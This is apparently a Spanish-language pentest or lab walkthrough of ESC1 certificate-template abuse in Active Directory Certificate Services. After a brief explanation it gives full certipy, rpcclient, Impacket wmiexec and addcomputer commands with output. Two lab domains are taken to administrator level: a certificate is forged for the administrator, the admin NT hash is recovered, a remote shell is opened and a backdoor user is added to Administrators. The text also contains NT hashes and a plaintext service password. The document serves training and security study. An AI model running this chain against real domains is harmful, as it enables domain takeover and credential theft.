
```bash
Abusing ESC1 via Template ACLs for Privilege Escalation
```


# ESC1 ‚Äî Abuso de Plantillas Vulnerables en AD CS

## ‚úÖ ¬øQu√© es ESC1?
ESC1 es una vulnerabilidad en **Active Directory Certificate Services (AD CS)** donde una
**plantilla de certificado permite que el solicitante (enrollee) elija el Subject/UPN** del
certificado que quiere generar.

Si la plantilla tambi√©n incluye **Client Authentication (EKU)**, el atacante puede:
- Solicitar un certificado con el UPN de cualquier usuario (ej. `administrator@dominio.local`)
- Autenticarse en el dominio como ese usuario
- Obtener TGT/NT hash ‚Üí **escalar privilegios a DA**

## ‚ö†Ô∏è Condiciones que hacen vulnerable una plantilla (ESC1)
Debe cumplir **todas**:
- `EnrolleeSuppliesSubject = True` ‚úÖ
- Tiene EKU de **Client Authentication** ‚úÖ
- Cualquier usuario puede inscribirse (Domain Users, Authenticated Users, etc.) ‚úÖ
- La CA emite certificados usando esa plantilla ‚úÖ

Si esto se da, **cualquier usuario autenticado puede suplantar identidades**.

---

## üîç Enumeraci√≥n para detectar ESC1

```bash
certipy find -u 'usuario@dominio.local' -hashes :<NTLM> -dc-ip <DC-IP> -enabled -vuln




``` bash
‚îî‚îÄ$ certipy find -u 'tel_engineer01@telecore.ad' -hashes ':e2b1996aaff0f57bccb916265a77970e' -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: PKI-Srv.telecore.ad
[*] Retrieving CA configuration for 'telecore-PKI-SRV-CA' via RRP
[-] Failed to connect to remote registry: [Errno Connection error (PKI-Srv.telecore.ad:445)] [Errno -2] Name or service not known
[-] Use -debug to print a stacktrace
[!] Failed to get CA configuration for 'telecore-PKI-SRV-CA' via RRP: 'NoneType' object has no attribute 'request'
[!] Use -debug to print a stacktrace
[!] Could not retrieve configuration for 'telecore-PKI-SRV-CA'
[*] Checking web enrollment for CA 'telecore-PKI-SRV-CA' @ 'PKI-Srv.telecore.ad'
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: PKI-Srv.telecore.ad
[!] Error checking web enrollment: [Errno -2] Name or service not known
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: PKI-Srv.telecore.ad
[!] Error checking web enrollment: [Errno -2] Name or service not known
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : telecore-PKI-SRV-CA
    DNS Name                            : PKI-Srv.telecore.ad
    Certificate Subject                 : CN=telecore-PKI-SRV-CA, DC=telecore, DC=ad
    Certificate Serial Number           : 35DFAB7883C30297420CBFD2E33CB408
    Certificate Validity Start          : 2025-08-21 07:41:20+00:00
    Certificate Validity End            : 2125-08-21 07:51:20+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : Badges
    Display Name                        : Badges
    Certificate Authorities             : telecore-PKI-SRV-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-06T17:33:55+00:00
    Template Last Modified              : 2025-09-06T17:34:15+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
      Object Control Permissions
        Owner                           : TELECORE.AD\Administrator
        Full Control Principals         : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
                                          TELECORE.AD\tel_admin01
        Write Owner Principals          : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
                                          TELECORE.AD\tel_admin01
        Write Dacl Principals           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
                                          TELECORE.AD\tel_admin01
        Write Property Enroll           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
    [+] User Enrollable Principals      : TELECORE.AD\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
  1
    Template Name                       : Tel_User
    Display Name                        : Tel_User
    Certificate Authorities             : telecore-PKI-SRV-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-08-22T08:02:50+00:00
    Template Last Modified              : 2025-08-22T08:02:52+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TELECORE.AD\tel_engineer01
                                          TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
      Object Control Permissions
        Owner                           : TELECORE.AD\Administrator
        Full Control Principals         : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Write Owner Principals          : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Write Dacl Principals           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Write Property Enroll           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
    [+] User Enrollable Principals      : TELECORE.AD\Domain Users
                                          TELECORE.AD\tel_engineer01
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```


```bash
‚îå‚îÄ‚îÄ(adrts)‚îÄ(kali„âøkali)-[~/machines/adrts/exploits]
‚îî‚îÄ$ rpcclient -U 'telecore.ad/tel_engineer01%e2b1996aaff0f57bccb916265a77970e' --pw-nt-hash 10.5.2.2 -c "lookupnames administrator"

administrator S-1-5-21-1588247407-410625039-1511794522-500 (User: 1)
```


``` bash
‚îå‚îÄ‚îÄ(adrts)‚îÄ(kali„âøkali)-[~/machines/adrts/exploits]
‚îî‚îÄ$ certipy -debug req -u 'tel_engineer01' -hashes 'e2b1996aaff0f57bccb916265a77970e' -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Tel_User' -upn 'administrator@telecore.ad' -sid 'S-1-5-21-1588247407-410625039-1511794522-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: None
[+] DC IP: None
[+] DC Host: None
[+] Target IP: '10.5.2.8'
[+] Remote Name: '10.5.2.8'
[+] Domain: ''
[+] Username: 'TEL_ENGINEER01'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.5.2.8[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.5.2.8[\pipe\cert]
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@telecore.ad'
[+] Found SID in SAN URL: 'S-1-5-21-1588247407-410625039-1511794522-500'
[+] Found SID in security extension: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*] Certificate object SID is 'S-1-5-21-1588247407-410625039-1511794522-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
certipy -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.5.2.2'
[+] DC IP: '10.5.2.2'
[+] DC Host: ''
[+] Target IP: '10.5.2.2'
[+] Remote Name: '10.5.2.2'
[+] Domain: ''
[+] Username: ''
[*] Certificate identities:
[*]     SAN UPN: 'administrator@telecore.ad'
[*]     SAN URL SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*]     Security Extension SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
[+] Found SID in SAN URL: 'S-1-5-21-1588247407-410625039-1511794522-500'
[+] Found SID in security extension: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*] Using principal: 'administrator@telecore.ad'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC telecore.ad (10.5.2.2)
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[+] Attempting to write data to 'administrator.ccache'
[+] Data written to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@telecore.ad': aad3b435b51404eeaad3b435b51404ee:bfb19bca32a6aab8e0b9a836da860e32
```

```java
smbclient -L 10.5.2.2 -U 'administrator%bfb19bca32a6aab8e0b9a836da860e32' --pw-nt-hash 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.5.2.2 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
wmiexec.py -hashes :bfb19bca32a6aab8e0b9a836da860e32 'administrator@10.5.2.2'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is F4E0-A0A6

 Directory of C:\

07/26/2025  01:01 AM    <DIR>          inetpub
05/08/2021  12:20 AM    <DIR>          PerfLogs
07/25/2025  10:39 PM    <DIR>          Program Files
05/08/2021  01:39 AM    <DIR>          Program Files (x86)
07/25/2025  10:18 AM    <DIR>          Users
11/22/2025  11:25 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   8,007,061,504 bytes free
```


*****************************

Otro  Escenario

Black Hills Information Security public√≥ una interesante¬†[publicaci√≥n sobre ESC1](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)¬†. ESC1 es la vulnerabilidad que se presenta cuando el ADCS est√° configurado para permitir que usuarios con pocos privilegios se registren y soliciten un certificado en nombre de cualquier objeto de dominio, incluidos los privilegiados.

El ejemplo dado en el post muestra las configuraciones que deben tenerse para que esto funcione, y coincide con lo que sale de Authority, excepto por una diferencia:



``` shell
certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

``` shell
addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'ping' -computer-pass 'ping123%$' -dc-ip 10.129.229.56
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ping$ with password ping123%$.
```

```shell
certipy req -username 'ping$'  -p 'ping123%$' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn 'administrator@authority.htb' -dns authority.htb  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_authority.pfx'
[*] Wrote certificate and private key to 'administrator_authority.pfx'
```

```shell
certipy auth -pfx administrator_authority.pfx -dc-ip 10.129.229.56  -ldap-shell
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN DNS Host Name: 'authority.htb'
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands

# dir
*** Unknown syntax: dir

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration info
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sA
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given comp
 grant_control [search_base] target grantee - Grant full control on a given target obje).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to 
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RB
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass 
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. T
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# add_user elfojhon
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: elfojhon and password: C9U|!24v')w*d~[ result: OK

# add_user_to_group elfojhon administrator
LDAPObjectClassViolationResult - 65 - objectClassViolation - None - 0000207D: UpdErr: D
 - modifyResponse - None

# add_user_to_group elfojhon administrators
Adding user: elfojhon to group Administrators result: OK
```




